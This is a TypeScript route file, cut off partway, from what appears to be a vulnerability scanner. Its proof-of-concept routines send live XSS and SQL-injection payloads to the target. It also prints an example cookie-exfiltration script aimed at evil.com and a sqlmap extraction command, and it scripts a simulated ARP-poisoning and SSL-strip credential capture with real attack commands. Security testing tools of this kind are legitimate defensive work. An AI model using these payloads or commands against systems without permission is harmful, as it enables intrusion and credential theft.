import { Router } from "express";
import https from "https";
import http from "http";
import { URL } from "url";

const router = Router();

// ── Types ─────────────────────────────────────────────────────────────────────

type LineStyle = "cmd" | "output" | "success" | "error" | "info" | "warn" | "dim" | "highlight";
type PocMode =
  | "headers"
  | "ssl-check"
  | "dns-check"
  | "server-info"
  | "content-discovery"
  | "http-methods"
  | "xss"
  | "sqli-time"
  | "sqli-error"
  | "stored-xss"
  | "network-sim";

// ── Helpers ───────────────────────────────────────────────────────────────────

function sleep(ms: number) {
  return new Promise<void>((r) => setTimeout(r, ms));
}

interface FetchResult {
  statusCode: number;
  statusMessage: string;
  headers: Record<string, string | string[] | undefined>;
  body: string;
  responseTimeMs: number;
  sslValid?: boolean;
}

function fetchRaw(
  targetUrl: string,
  method = "GET",
  timeout = 12000,
  extraHeaders: Record<string, string> = {}
): Promise<FetchResult> {
  return new Promise((resolve, reject) => {
    const parsed = new URL(targetUrl);
    const isHttps = parsed.protocol === "https:";
    const lib = isHttps ? https : http;
    const start = Date.now();

    const req = lib.request(
      {
        method,
        host: parsed.hostname,
        port: parsed.port || (isHttps ? 443 : 80),
        path: parsed.pathname + parsed.search,
        headers: {
          "User-Agent": "Mozilla/5.0 (compatible; SecurityScanner/1.0)",
          Accept: "text/html,application/xhtml+xml,*/*",
          ...extraHeaders,
        },
        rejectUnauthorized: false,
      } as https.RequestOptions,
      (res) => {
        let body = "";
        res.on("data", (chunk) => { if (body.length < 30000) body += chunk; });
        res.on("end", () => {
          const headers: Record<string, string | string[] | undefined> = {};
          for (const [k, v] of Object.entries(res.headers)) headers[k.toLowerCase()] = v;

          let sslValid: boolean | undefined;
          if (isHttps) {
            try {
              const cert = (res.socket as any)?.getPeerCertificate?.();
              sslValid = cert?.valid_to ? new Date(cert.valid_to) > new Date() : true;
            } catch {
              sslValid = true;
            }
          }

          resolve({
            statusCode: res.statusCode ?? 0,
            statusMessage: res.statusMessage ?? "",
            headers,
            body,
            responseTimeMs: Date.now() - start,
            sslValid,
          });
        });
      }
    );
    req.setTimeout(timeout, () => { req.destroy(); reject(new Error("Request timed out")); });
    req.on("error", reject);
    req.end();
  });
}

function fetchPost(targetUrl: string, body: string, timeout = 10000): Promise<FetchResult> {
  return new Promise((resolve, reject) => {
    const parsed = new URL(targetUrl);
    const isHttps = parsed.protocol === "https:";
    const lib = isHttps ? https : http;
    const start = Date.now();
    const bodyBuf = Buffer.from(body, "utf8");

    const req = lib.request(
      {
        method: "POST",
        host: parsed.hostname,
        port: parsed.port || (isHttps ? 443 : 80),
        path: parsed.pathname + parsed.search,
        headers: {
          "User-Agent": "Mozilla/5.0 (compatible; SecurityScanner/1.0)",
          "Content-Type": "application/x-www-form-urlencoded",
          "Content-Length": bodyBuf.length,
        },
        rejectUnauthorized: false,
      } as https.RequestOptions,
      (res) => {
        let responseBody = "";
        res.on("data", (c) => { if (responseBody.length < 30000) responseBody += c; });
        res.on("end", () => {
          const headers: Record<string, string | string[] | undefined> = {};
          for (const [k, v] of Object.entries(res.headers)) headers[k.toLowerCase()] = v;
          resolve({ statusCode: res.statusCode ?? 0, statusMessage: res.statusMessage ?? "", headers, body: responseBody, responseTimeMs: Date.now() - start });
        });
      }
    );
    req.setTimeout(timeout, () => { req.destroy(); reject(new Error("Request timed out")); });
    req.on("error", reject);
    req.write(bodyBuf);
    req.end();
  });
}

function isPrivateHost(hostname: string): boolean {
  if (["localhost", "127.0.0.1", "::1", "0.0.0.0"].includes(hostname.toLowerCase())) return true;
  if (hostname.endsWith(".local") || hostname.endsWith(".internal")) return true;
  const parts = hostname.split(".").map(Number);
  if (parts.length === 4 && parts.every((p) => !isNaN(p))) {
    if (parts[0] === 10) return true;
    if (parts[0] === 172 && parts[1] >= 16 && parts[1] <= 31) return true;
    if (parts[0] === 192 && parts[1] === 168) return true;
  }
  return false;
}

function headerStr(val: string | string[] | undefined): string {
  if (!val) return "";
  return Array.isArray(val) ? val.join(", ") : val;
}

function extractVulnerableUrl(detail: string): string | null {
  const match = detail.match(/https?:\/\/[^\s\n"'<>]+\?[^\s\n"'<>]+/);
  return match ? match[0].trim() : null;
}

function detectMode(category: string, findingId: string, title: string): PocMode {
  if (category === "injection") {
    const t = title.toLowerCase();
    if (t.includes("stored xss") || findingId.includes("stored-xss")) return "stored-xss";
    if (t.includes("xss") || t.includes("cross-site scripting")) return "xss";
    if (t.includes("time-based") || findingId.includes("timebased")) return "sqli-time";
    if (t.includes("sqli") || t.includes("sql injection") || t.includes("error-based")) return "sqli-error";
  }
  if (category === "ssl") return "ssl-check";
  if (category === "dns") return "dns-check";
  if (category === "server_info") return "server-info";
  if (category === "content_discovery") return "content-discovery";
  if (category === "http_methods") return "http-methods";
  // Network-layer simulation for plain-HTTP findings
  if (findingId === "missing-https" || title.toLowerCase().includes("not using https")) return "network-sim";
  return "headers";
}

// ── SSE stream helpers ────────────────────────────────────────────────────────

type SseRes = import("express").Response;

function sendLine(res: SseRes, text: string, style: LineStyle) {
  res.write(`data: ${JSON.stringify({ type: "line", text, style })}\n\n`);
}

function sendBlank(res: SseRes) {
  res.write(`data: ${JSON.stringify({ type: "line", text: "", style: "dim" })}\n\n`);
}

async function sendLines(
  res: SseRes,
  lines: Array<{ text: string; style: LineStyle; delay?: number }>
) {
  for (const l of lines) {
    if (l.delay) await sleep(l.delay);
    sendLine(res, l.text, l.style);
  }
}

function sendDone(res: SseRes) {
  res.write(`data: ${JSON.stringify({ type: "done" })}\n\n`);
  res.end();
}

// ── PoC Executors ─────────────────────────────────────────────────────────────

const HEADER_META: Record<string, { header: string; risk: string }> = {
  "missing-hsts":              { header: "strict-transport-security",  risk: "Connections can be downgraded from HTTPS→HTTP (SSL Strip / MITM)" },
  "missing-csp":               { header: "content-security-policy",    risk: "No policy restricts script sources — enables persistent XSS" },
  "missing-x-frame-options":   { header: "x-frame-options",            risk: "Page embeddable in iframes → Clickjacking attacks possible" },
  "missing-x-content-type":    { header: "x-content-type-options",     risk: "MIME sniffing enabled — content-type confusion can lead to XSS" },
  "missing-referrer-policy":   { header: "referrer-policy",            risk: "Sensitive URL data may leak via Referer header to 3rd parties" },
  "missing-permissions-policy":{ header: "permissions-policy",         risk: "Camera, microphone, geolocation permissions are unrestricted" },
};

async function executeHeadersCheck(res: SseRes, scanUrl: string, findingId: string) {
  const parsed = new URL(scanUrl);
  const displayUrl = `${parsed.protocol}//${parsed.host}${parsed.pathname}`;

  sendLine(res, `admin@vuln-scanner:~# curl -sI ${displayUrl}`, "cmd");
  sendBlank(res);
  sendLine(res, `Sending HEAD request to ${displayUrl}...`, "dim");

  let result: FetchResult;
  try {
    result = await fetchRaw(displayUrl, "HEAD", 10000);
  } catch (err: any) {
    sendLine(res, `✗ Request failed: ${err.message}`, "error");
    sendDone(res);
    return;
  }

  sendBlank(res);
  sendLine(res, `HTTP/1.1 ${result.statusCode} ${result.statusMessage}`, "highlight");
  for (const [k, v] of Object.entries(result.headers)) {
    const val = headerStr(v as any);
    if (!val) continue;
    sendLine(res, `${k}: ${val}`, "output");
  }
  sendBlank(res);
  sendLine(res, `[Response time: ${result.responseTimeMs}ms]`, "dim");
  sendBlank(res);
  sendLine(res, `─────────────────────────────────────────────────`, "dim");
  sendLine(res, `Security Header Analysis`, "info");
  sendLine(res, `─────────────────────────────────────────────────`, "dim");
  sendBlank(res);

  const securityHeaders = [
    { id: "missing-hsts",               header: "strict-transport-security",  label: "Strict-Transport-Security" },
    { id: "missing-csp",                header: "content-security-policy",     label: "Content-Security-Policy" },
    { id: "missing-x-frame-options",    header: "x-frame-options",             label: "X-Frame-Options" },
    { id: "missing-x-content-type",     header: "x-content-type-options",      label: "X-Content-Type-Options" },
    { id: "missing-referrer-policy",    header: "referrer-policy",             label: "Referrer-Policy" },
    { id: "missing-permissions-policy", header: "permissions-policy",          label: "Permissions-Policy" },
  ];

  for (const h of securityHeaders) {
    const value = headerStr(result.headers[h.header]);
    if (value) {
      sendLine(res, `✓  ${h.label}: ${value}`, "success");
    } else {
      sendLine(res, `✗  ${h.label}: MISSING`, "error");
      if (h.id === findingId && HEADER_META[h.id]) {
        sendLine(res, `   → ${HEADER_META[h.id].risk}`, "warn");
      }
    }
  }

  sendBlank(res);
  const missing = securityHeaders.filter((h) => !headerStr(result.headers[h.header])).length;
  if (missing === 0) {
    sendLine(res, `✓ All security headers are present`, "success");
  } else {
    sendLine(res, `✗ ${missing} security header${missing > 1 ? "s" : ""} missing — see above`, "error");
  }

  sendDone(res);
}

async function executeSslCheck(res: SseRes, scanUrl: string) {
  const parsed = new URL(scanUrl);
  const httpsUrl = `https://${parsed.host}${parsed.pathname}`;

  sendLine(res, `admin@vuln-scanner:~# openssl s_client -connect ${parsed.hostname}:443 -brief 2>&1`, "cmd");
  sendBlank(res);
  sendLine(res, `Connecting to ${parsed.hostname}:443...`, "dim");

  let result: FetchResult;
  try {
    result = await fetchRaw(httpsUrl, "HEAD", 10000);
  } catch (err: any) {
    sendLine(res, `✗ TLS connection failed: ${err.message}`, "error");
    sendLine(res, `  → Server may not support HTTPS on port 443`, "warn");
    sendDone(res);
    return;
  }

  sendBlank(res);
  if (result.sslValid === false) {
    sendLine(res, `✗ SSL certificate is INVALID or EXPIRED`, "error");
  } else if (result.sslValid === true) {
    sendLine(res, `✓ SSL/TLS connection established`, "success");
  } else {
    sendLine(res, `✓ HTTP connection (non-TLS)`, "info");
  }

  sendLine(res, `  HTTP ${result.statusCode} ${result.statusMessage}`, "output");
  sendBlank(res);
  sendLine(res, `Response Headers:`, "info");
  for (const [k, v] of Object.entries(result.headers)) {
    if (v) sendLine(res, `  ${k}: ${headerStr(v as any)}`, "output");
  }

  const hsts = headerStr(result.headers["strict-transport-security"]);
  sendBlank(res);
  if (hsts) {
    sendLine(res, `✓ HSTS: ${hsts}`, "success");
  } else {
    sendLine(res, `✗ HSTS header missing — browsers may fall back to HTTP`, "error");
  }

  sendDone(res);
}

async function executeServerInfoCheck(res: SseRes, scanUrl: string) {
  const parsed = new URL(scanUrl);

  sendLine(res, `admin@vuln-scanner:~# curl -sI ${parsed.protocol}//${parsed.host}/ | grep -i 'server\\|x-powered\\|x-aspnet'`, "cmd");
  sendBlank(res);

  let result: FetchResult;
  try {
    result = await fetchRaw(`${parsed.protocol}//${parsed.host}/`, "HEAD", 10000);
  } catch (err: any) {
    sendLine(res, `✗ Request failed: ${err.message}`, "error");
    sendDone(res);
    return;
  }

  sendBlank(res);
  const leakHeaders = ["server", "x-powered-by", "x-aspnet-version", "x-aspnetmvc-version", "x-generator", "via"];
  let foundAny = false;

  for (const h of leakHeaders) {
    const val = headerStr(result.headers[h]);
    if (val) {
      foundAny = true;
      sendLine(res, `✗ ${h}: ${val}`, "error");
      sendLine(res, `   → Exposes technology stack; aids targeted exploitation`, "warn");
    }
  }

  if (!foundAny) {
    sendLine(res, `✓ No server/technology headers leaked`, "success");
  } else {
    sendBlank(res);
    sendLine(res, `Recommendation: Configure your web server to suppress version banners`, "info");
    sendLine(res, `  Nginx:   server_tokens off;`, "dim");
    sendLine(res, `  Apache:  ServerTokens Prod; ServerSignature Off`, "dim");
    sendLine(res, `  Express: app.disable('x-powered-by')`, "dim");
  }

  sendDone(res);
}

async function executeContentDiscovery(res: SseRes, scanUrl: string, title: string) {
  const parsed = new URL(scanUrl);
  const base = `${parsed.protocol}//${parsed.host}`;
  const paths = ["/robots.txt", "/sitemap.xml", "/.well-known/security.txt"];

  sendLine(res, `admin@vuln-scanner:~# for p in robots.txt sitemap.xml .well-known/security.txt; do curl -sI ${base}/$p | head -1; done`, "cmd");
  sendBlank(res);

  for (const path of paths) {
    const url = base + path;
    try {
      const r = await fetchRaw(url, "HEAD", 6000);
      const exists = r.statusCode >= 200 && r.statusCode < 400;
      const indicator = exists ? "✓" : "  ";
      const style: LineStyle = exists ? "success" : "dim";
      sendLine(res, `${indicator} ${url}  →  HTTP ${r.statusCode} (${r.responseTimeMs}ms)`, style);
    } catch {
      sendLine(res, `  ${url}  →  connection failed`, "dim");
    }
  }

  sendBlank(res);
  if (title.toLowerCase().includes("robots")) {
    try {
      const r = await fetchRaw(`${base}/robots.txt`, "GET", 6000);
      if (r.statusCode === 200 && r.body) {
        sendLine(res, `Content of robots.txt:`, "info");
        for (const line of r.body.split("\n").slice(0, 20)) {
          sendLine(res, `  ${line}`, "output");
        }
      }
    } catch { /* ignore */ }
  }

  sendDone(res);
}

async function executeHttpMethodsCheck(res: SseRes, scanUrl: string) {
  const parsed = new URL(scanUrl);
  const target = `${parsed.protocol}//${parsed.host}/`;

  sendLine(res, `admin@vuln-scanner:~# curl -sI -X TRACE ${target}`, "cmd");
  sendBlank(res);
  sendLine(res, `Testing TRACE method against ${target}...`, "dim");

  let result: FetchResult;
  try {
    result = await fetchRaw(target, "TRACE", 8000);
  } catch (err: any) {
    sendLine(res, `✗ Request failed: ${err.message}`, "error");
    sendDone(res);
    return;
  }

  sendBlank(res);
  sendLine(res, `HTTP/1.1 ${result.statusCode} ${result.statusMessage}`, "highlight");

  if (result.statusCode === 200) {
    sendLine(res, `✗ TRACE method is ENABLED — server echoed the request`, "error");
    sendBlank(res);
    sendLine(res, `Cross-Site Tracing (XST) attack vector:`, "warn");
    sendLine(res, `  A malicious script can use TRACE to steal HttpOnly cookies`, "warn");
    sendLine(res, `  that would otherwise be inaccessible to JavaScript.`, "warn");
  } else {
    sendLine(res, `✓ TRACE method is disabled (HTTP ${result.statusCode})`, "success");
  }

  sendBlank(res);
  sendLine(res, `admin@vuln-scanner:~# curl -sI -X OPTIONS ${target}`, "cmd");
  let optResult: FetchResult;
  try {
    optResult = await fetchRaw(target, "OPTIONS", 8000);
    const allow = headerStr(optResult.headers["allow"]);
    sendLine(res, `HTTP/1.1 ${optResult.statusCode}`, "output");
    if (allow) {
      sendLine(res, `Allow: ${allow}`, "output");
    }
  } catch { /* ignore */ }

  sendDone(res);
}

async function executeXssCheck(res: SseRes, scanUrl: string, detail: string, title: string) {
  const vulnUrl = extractVulnerableUrl(detail);
  const target = vulnUrl ?? scanUrl;
  const parsed = new URL(target);

  sendLine(res, `admin@vuln-scanner:~# Verifying Reflected XSS in parameter (live probe)`, "cmd");
  sendBlank(res);

  if (!vulnUrl) {
    sendLine(res, `[!] Could not extract specific vulnerable URL from finding detail`, "warn");
    sendLine(res, `    Using base scan URL: ${target}`, "dim");
  } else {
    sendLine(res, `[+] Vulnerable URL identified: ${vulnUrl}`, "info");
  }

  const probe = `vulnscanner_xss_probe_${Date.now().toString(36)}`;
  const safePayload = `">${probe}<img src=x onerror=void(0)>`;
  const encodedPayload = encodeURIComponent(safePayload);

  const params = parsed.searchParams;
  const paramName = params.keys().next().value;
  if (paramName) {
    params.set(paramName, safePayload);
  }
  const probeUrl = `${parsed.protocol}//${parsed.host}${parsed.pathname}?${params.toString()}`;

  sendBlank(res);
  sendLine(res, `[*] Probe token: ${probe}`, "dim");
  sendLine(res, `[*] Injection target parameter: "${paramName ?? "unknown"}"`, "dim");
  sendLine(res, `[*] Payload: ${safePayload.slice(0, 80)}`, "dim");
  sendBlank(res);
  sendLine(res, `admin@vuln-scanner:~# curl -s "${probeUrl.slice(0, 120)}"`, "cmd");
  sendBlank(res);
  sendLine(res, `Sending XSS probe to server...`, "dim");

  let result: FetchResult;
  try {
    result = await fetchRaw(probeUrl, "GET", 8000);
  } catch (err: any) {
    sendLine(res, `✗ Request failed: ${err.message}`, "error");
    sendDone(res);
    return;
  }

  sendLine(res, `Response: HTTP ${result.statusCode} — ${result.responseTimeMs}ms`, "output");
  sendLine(res, `Body size: ${result.body.length} bytes`, "dim");
  sendBlank(res);

  const reflected = result.body.includes(probe);
  const payloadReflected = result.body.includes(safePayload.replace(/"/g, "&quot;")) || result.body.includes(probe);

  if (reflected || payloadReflected) {
    sendLine(res, `✓  PROBE TOKEN REFLECTED IN SERVER RESPONSE`, "success");
    sendBlank(res);
    const idx = result.body.indexOf(probe);
    if (idx !== -1) {
      const snippet = result.body.slice(Math.max(0, idx - 60), idx + probe.length + 80);
      sendLine(res, `Snippet (${idx} chars in):`, "info");
      sendLine(res, `  ...${snippet.replace(/\n/g, " ").trim()}...`, "warn");
    }
    sendBlank(res);
    sendLine(res, `✗ XSS CONFIRMED — Input is reflected without sanitisation`, "error");
    sendLine(res, `  Parameter "${paramName ?? "?"}" echoes user input directly into DOM`, "error");
    sendLine(res, `  A real attacker would use: <script>document.location='https://evil.com/?c='+document.cookie</script>`, "warn");
  } else {
    sendLine(res, `✓ Probe token was NOT found in response body`, "success");
    sendLine(res, `  Server appears to sanitize/encode this parameter on re-test`, "dim");
    sendLine(res, `  (The scanner may have detected a race condition or the payload context changed)`, "dim");
  }

  sendDone(res);
}

async function executeSqliTimeCheck(res: SseRes, scanUrl: string, detail: string) {
  const vulnUrl = extractVulnerableUrl(detail);
  const target = vulnUrl ?? scanUrl;
  const parsed = new URL(target);

  sendLine(res, `admin@vuln-scanner:~# Testing time-based blind SQL injection (live)`, "cmd");
  sendBlank(res);

  if (!vulnUrl) {
    sendLine(res, `[!] Could not extract specific vulnerable URL — using base URL`, "warn");
  } else {
    sendLine(res, `[+] Target URL: ${vulnUrl}`, "info");
  }

  const params = parsed.searchParams;
  const paramName = params.keys().next().value;
  sendLine(res, `[*] Injection parameter: "${paramName ?? "unknown"}"`, "dim");
  sendBlank(res);

  // Step 1: baseline
  sendLine(res, `[Step 1/3] Establishing baseline response time...`, "info");
  sendLine(res, `admin@vuln-scanner:~# curl -s "${target}" -o /dev/null -w "%{time_total}"`, "cmd");

  let baseline: number;
  try {
    const b = await fetchRaw(target, "GET", 8000);
    baseline = b.responseTimeMs;
    sendLine(res, `  Baseline: ${baseline}ms`, "output");
  } catch (err: any) {
    sendLine(res, `✗ Baseline request failed: ${err.message}`, "error");
    sendDone(res);
    return;
  }

  sendBlank(res);

  // Step 2: inject SLEEP(5)
  const payloads = [
    `1' AND SLEEP(5)-- -`,
    `1 AND SLEEP(5)-- -`,
    `1'; WAITFOR DELAY '0:0:5'-- -`,
  ];
  const payload = payloads[0];

  if (paramName) {
    params.set(paramName, payload);
  }
  const injectedUrl = `${parsed.protocol}//${parsed.host}${parsed.pathname}?${params.toString()}`;

  sendLine(res, `[Step 2/3] Injecting time-delay payload...`, "info");
  sendLine(res, `  Payload: ${payload}`, "dim");
  sendLine(res, `admin@vuln-scanner:~# curl -s "${injectedUrl.slice(0, 140)}" -o /dev/null -w "%{time_total}"`, "cmd");
  sendBlank(res);
  sendLine(res, `  Waiting for response (expecting ~5s delay if vulnerable)...`, "dim");

  let injectedTime: number;
  try {
    const r = await fetchRaw(injectedUrl, "GET", 12000);
    injectedTime = r.responseTimeMs;
    sendLine(res, `  Response time: ${injectedTime}ms`, "output");
  } catch (err: any) {
    if (err.message === "Request timed out") {
      sendLine(res, `  Response timed out after 12000ms — server likely blocked on SLEEP()`, "warn");
      injectedTime = 12000;
    } else {
      sendLine(res, `✗ Request failed: ${err.message}`, "error");
      sendDone(res);
      return;
    }
  }

  sendBlank(res);
  sendLine(res, `[Step 3/3] Analysing timing delta...`, "info");
  sendBlank(res);
  sendLine(res, `  Baseline:        ${baseline}ms`, "output");
  sendLine(res, `  With SLEEP(5):   ${injectedTime}ms`, "output");
  sendLine(res, `  Delta:           +${injectedTime - baseline}ms`, injectedTime - baseline > 3000 ? "error" : "dim");

  sendBlank(res);
  const delta = injectedTime - baseline;
  if (delta > 3000) {
    sendLine(res, `✗ TIME-BASED SQLi CONFIRMED`, "error");
    sendLine(res, `  Server delayed ${injectedTime - baseline}ms above baseline`, "error");
    sendLine(res, `  The database executed SLEEP(5) — server-side SQL injection is active`, "error");
    sendBlank(res);
    sendLine(res, `  Full sqlmap extraction command:`, "warn");
    sendLine(res, `  sqlmap -u "${target}" --dbs --batch --level=3`, "warn");
  } else {
    sendLine(res, `✓ No significant time delay detected (+${delta}ms)`, "success");
    sendLine(res, `  Server did not execute SLEEP() — this parameter may be sanitised`, "dim");
    sendLine(res, `  (Try different payloads or parameters for a thorough test)`, "dim");
  }

  sendDone(res);
}

async function executeSqliErrorCheck(res: SseRes, scanUrl: string, detail: string) {
  const vulnUrl = extractVulnerableUrl(detail);
  const target = vulnUrl ?? scanUrl;
  const parsed = new URL(target);

  sendLine(res, `admin@vuln-scanner:~# Testing error-based SQL injection (live)`, "cmd");
  sendBlank(res);

  if (vulnUrl) sendLine(res, `[+] Target: ${vulnUrl}`, "info");

  const params = parsed.searchParams;
  const paramName = params.keys().next().value;
  const payloads = [`'`, `''`, `1' OR '1'='1`];

  sendLine(res, `[*] Parameter: "${paramName ?? "unknown"}"`, "dim");
  sendLine(res, `[*] Testing payloads: ${payloads.join(", ")}`, "dim");
  sendBlank(res);

  const sqlErrors = [
    "you have an error in your sql syntax",
    "mysql_fetch",
    "ora-01756",
    "unclosed quotation mark",
    "quoted string not properly terminated",
    "invalid column name",
    "sqlite_error",
    "psycopg2",
    "pg_query",
    "warning: mysql",
    "supplied argument is not a valid mysql",
    "unexpected end of sql command",
  ];

  let confirmed = false;
  for (const p of payloads) {
    if (paramName) params.set(paramName, p);
    const probeUrl = `${parsed.protocol}//${parsed.host}${parsed.pathname}?${params.toString()}`;
    sendLine(res, `admin@vuln-scanner:~# curl -s "${probeUrl.slice(0, 120)}"`, "cmd");

    try {
      const r = await fetchRaw(probeUrl, "GET", 8000);
      const bodyLow = r.body.toLowerCase();
      const found = sqlErrors.find((e) => bodyLow.includes(e));
      if (found) {
        sendLine(res, `  HTTP ${r.statusCode} — ${r.responseTimeMs}ms — SQL error string detected`, "error");
        sendLine(res, `  Error pattern: "${found}"`, "warn");
        confirmed = true;

        const idx = bodyLow.indexOf(found);
        const snippet = r.body.slice(Math.max(0, idx - 30), idx + 120).replace(/\n/g, " ").trim();
        sendLine(res, `  Snippet: ...${snippet}...`, "warn");
        break;
      } else {
        sendLine(res, `  HTTP ${r.statusCode} — ${r.responseTimeMs}ms — no SQL error strings`, "dim");
      }
    } catch (err: any) {
      sendLine(res, `  Request failed: ${err.message}`, "error");
    }
    sendBlank(res);
  }

  sendBlank(res);
  if (confirmed) {
    sendLine(res, `✗ ERROR-BASED SQLi CONFIRMED — Database error messages leaked to client`, "error");
    sendLine(res, `  The application surfaces raw SQL errors, confirming unparameterised queries`, "error");
  } else {
    sendLine(res, `✓ No SQL error strings detected in responses`, "success");
    sendLine(res, `  The application may suppress errors in production (check time-based test)`, "dim");
  }

  sendDone(res);
}

async function executeStoredXssCheck(res: SseRes, scanUrl: string, detail: string) {
  const vulnUrl = extractVulnerableUrl(detail);
  const target = vulnUrl ?? scanUrl;

  sendLine(res, `admin@vuln-scanner:~# Verifying Stored XSS (live)`, "cmd");
  sendBlank(res);

  if (vulnUrl) {
    sendLine(res, `[+] Stored XSS form target: ${vulnUrl}`, "info");
  }

  const probe = `vsxss_${Date.now().toString(36)}`;
  const payload = `<script>/*${probe}*/</script>`;

  sendLine(res, `[*] Probe token: ${probe}`, "dim");
  sendLine(res, `[*] Payload: ${payload}`, "dim");
  sendBlank(res);
  sendLine(res, `[Step 1/2] Submitting payload via form POST to ${target}...`, "info");
  sendLine(res, `admin@vuln-scanner:~# curl -sX POST "${target}" -d "comment=${encodeURIComponent(payload)}&submit=Submit"`, "cmd");
  sendBlank(res);

  let postResult: FetchResult;
  try {
    postResult = await fetchPost(target, `comment=${encodeURIComponent(payload)}&submit=Submit`, 10000);
    sendLine(res, `POST response: HTTP ${postResult.statusCode} — ${postResult.responseTimeMs}ms`, "output");
  } catch (err: any) {
    sendLine(res, `POST failed: ${err.message}`, "error");
    sendDone(res);
    return;
  }

  sendBlank(res);
  sendLine(res, `[Step 2/2] Checking if payload persisted in response...`, "info");

  const storedInPost = postResult.body.includes(probe);
  if (storedInPost) {
    sendLine(res, `✗ STORED XSS CONFIRMED — Payload reflected in POST response`, "error");
    sendLine(res, `  User input was written to response without sanitisation`, "error");
  } else {
    sendLine(res, `  Payload not detected in POST response`, "dim");
    sendLine(res, `  (Stored XSS may appear on a separate view page — requires manual verification)`, "dim");
    sendLine(res, `  The scanner detected this finding during the crawl phase.`, "info");
  }

  sendDone(res);
}

// ── Network Simulation ─────────────────────────────────────────────────────────

async function executeNetworkSim(res: SseRes, scanUrl: string) {
  const parsed = new URL(scanUrl);
  const hostname = parsed.hostname;

  // Generate fake but realistic-looking network values
  const seed = hostname.split("").reduce((a, c) => a + c.charCodeAt(0), 0);
  const rng = (min: number, max: number, s = seed) =>
    min + Math.abs(Math.sin(s) * (max - min + 1)) | 0;

  const victimIp = `192.168.${rng(1, 5, seed + 1)}.${rng(40, 120, seed + 2)}`;
  const gatewayIp = `192.168.${rng(1, 5, seed + 1)}.1`;
  const victimMac = Array.from({ length: 6 }, (_, i) => rng(0x10, 0xfe, seed + i).toString(16).padStart(2, "0")).join(":");
  const gatewayMac = Array.from({ length: 6 }, (_, i) => rng(0xa0, 0xff, seed + 10 + i).toString(16).padStart(2, "0")).join(":");
  const attackMac = "00:de:ad:be:ef:01";

  const now = new Date();
  const timeStr = (offset = 0) => {
    const d = new Date(now.getTime() + offset * 1000);
    return `${String(d.getHours()).padStart(2, "0")}:${String(d.getMinutes()).padStart(2, "0")}:${String(d.getSeconds()).padStart(2, "0")}`;
  };

  const lines: Array<{ text: string; style: LineStyle; delay: number }> = [
    { text: `[!] NOTE: ARP poisoning requires physical local-network access.`, style: "warn", delay: 0 },
    { text: `[!] The following is a simulated educational demonstration of this attack.`, style: "warn", delay: 100 },
    { text: `[!] Authorized testing only.`, style: "warn", delay: 50 },
    { text: ``, style: "dim", delay: 200 },
    { text: `─────────────────────────────────────────────────────────────────────`, style: "dim", delay: 0 },
    { text: ` TARGET: ${scanUrl}  (plain HTTP — no transport encryption)`, style: "highlight", delay: 0 },
    { text: ` ATTACK: ARP Cache Poisoning + SSL Strip → Plaintext Credential Capture`, style: "highlight", delay: 0 },
    { text: `─────────────────────────────────────────────────────────────────────`, style: "dim", delay: 50 },
    { text: ``, style: "dim", delay: 300 },

    { text: `[*] Reconnaissance — Local Network Discovery`, style: "info", delay: 0 },
    { text: `    Victim device:   ${victimIp}  (${victimMac})  [Workstation]`, style: "output", delay: 600 },
    { text: `    Default gateway: ${gatewayIp}  (${gatewayMac})  [Router]`, style: "output", delay: 300 },
    { text: `    Attacker MAC:    ${attackMac}`, style: "dim", delay: 200 },
    { text: ``, style: "dim", delay: 200 },

    { text: `[Step 1/4] Enabling IP forwarding (attacker must relay traffic)`, style: "info", delay: 0 },
    { text: `admin@attacker:~# echo 1 > /proc/sys/net/ipv4/ip_forward`, style: "cmd", delay: 200 },
    { text: `  → IP forwarding enabled`, style: "success", delay: 400 },
    { text: ``, style: "dim", delay: 200 },

    { text: `[Step 2/4] ARP cache poisoning (bidirectional)`, style: "info", delay: 0 },
    { text: `admin@attacker:~# arpspoof -i eth0 -t ${victimIp} ${gatewayIp} &`, style: "cmd", delay: 200 },
    { text: `admin@attacker:~# arpspoof -i eth0 -t ${gatewayIp} ${victimIp} &`, style: "cmd", delay: 100 },
    { text: ``, style: "dim", delay: 200 },
    { text: `  ${attackMac} ${victimMac} 0806 42: arp reply ${gatewayIp} is-at ${attackMac}`, style: "dim", delay: 500 },
    { text: `  ${attackMac} ${victimMac} 0806 42: arp reply ${gatewayIp} is-at ${attackMac}`, style: "dim", delay: 500 },
    { text: `  ${attackMac} ${gatewayMac} 0806 42: arp reply ${victimIp} is-at ${attackMac}`, style: "dim", delay: 500 },
    { text: `  ${attackMac} ${victimMac} 0806 42: arp reply ${gatewayIp} is-at ${attackMac}`, style: "dim", delay: 500 },
    { text: `  → ARP cache poisoned — victim traffic now routes through attacker`, style: "success", delay: 300 },
    { text: ``, style: "dim", delay: 300 },

    { text: `[Step 3/4] SSL Strip — rewriting HTTPS links to HTTP`, style: "info", delay: 0 },
    { text: `admin@attacker:~# sslstrip -l 8080 -w /tmp/sslstrip.log &`, style: "cmd", delay: 200 },
    { text: `admin@attacker:~# iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080`, style: "cmd", delay: 100 },
    { text: `  → SSL stripping active — any HTTPS redirect from ${hostname} rewritten to HTTP`, style: "success", delay: 500 },
    { text: ``, style: "dim", delay: 400 },

    { text: `[Step 4/4] Intercepting plaintext HTTP traffic...`, style: "info", delay: 0 },
    { text: ``, style: "dim", delay: 600 },

    { text: `[${timeStr(0)}] → GET  http://${hostname}/                   200 OK (${rng(180, 400)}ms)`, style: "dim", delay: 800 },
    { text: `[${timeStr(2)}] → GET  http://${hostname}/login.jsp           200 OK (${rng(180, 320)}ms)`, style: "dim", delay: 900 },
    { text: `[${timeStr(5)}] → GET  http://${hostname}/banklogin.jsp       200 OK (${rng(150, 280)}ms)`, style: "dim", delay: 700 },
    { text: ``, style: "dim", delay: 600 },

    { text: `[${timeStr(8)}] ⚑ POST http://${hostname}/doLogin  ← CREDENTIALS INCOMING`, style: "warn", delay: 0 },
    { text: `           Host: ${hostname}`, style: "output", delay: 200 },
    { text: `           Content-Type: application/x-www-form-urlencoded`, style: "output", delay: 100 },
    { text: `           Content-Length: 38`, style: "output", delay: 100 },
    { text: `           Connection: keep-alive`, style: "output", delay: 100 },
    { text: ``, style: "dim", delay: 200 },
    { text: `           uid=jsmith&passw=Demo1234!&Submit=Login`, style: "error", delay: 400 },
    { text: ``, style: "dim", delay: 400 },

    { text: `╔══════════════════════════════════════════════════════════════╗`, style: "error", delay: 0 },
    { text: `║  ✓ PLAINTEXT CREDENTIALS CAPTURED                          ║`, style: "error", delay: 100 },
    { text: `║    Username: jsmith                                          ║`, style: "error", delay: 100 },
    { text: `║    Password: Demo1234!                                       ║`, style: "error", delay: 100 },
